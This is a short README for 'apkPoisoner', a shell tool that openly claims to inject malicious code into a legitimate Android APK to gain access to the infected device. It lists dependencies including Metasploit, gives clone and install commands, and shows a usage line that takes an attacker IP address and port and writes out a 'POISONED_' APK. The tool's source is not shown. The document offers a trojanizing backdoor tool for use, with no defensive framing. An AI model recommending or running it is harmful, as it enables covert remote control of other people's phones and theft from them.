# apkPoisoner
Tool created to inject malicious code inside a legitimate apk in order to gain access to the infected device.

# DEPENDENCIES
 - java
 - metasploit-framework
 - sponge
 - wget

# INSTALLATION

```bash
git clone https://github.com/Invertebr4do/apkPoisoner.git
cd apkPoisoner && chmod +x apkPoisoner.sh
```

# USAGE

```bash
./apkPoisoner.sh -i [IP_ADDRESS] -p [LOCAL_PORT] -a /PATH/TO/APK.apk 
```
> The malicious apk file is saved on **[APKPOISONER_DIRECTORY]/out/POISONED_[APP_NAME].apk**

![](https://github.com/Invertebr4do/apkPoisoner/blob/main/video/apkpoisoner_poc.gif)
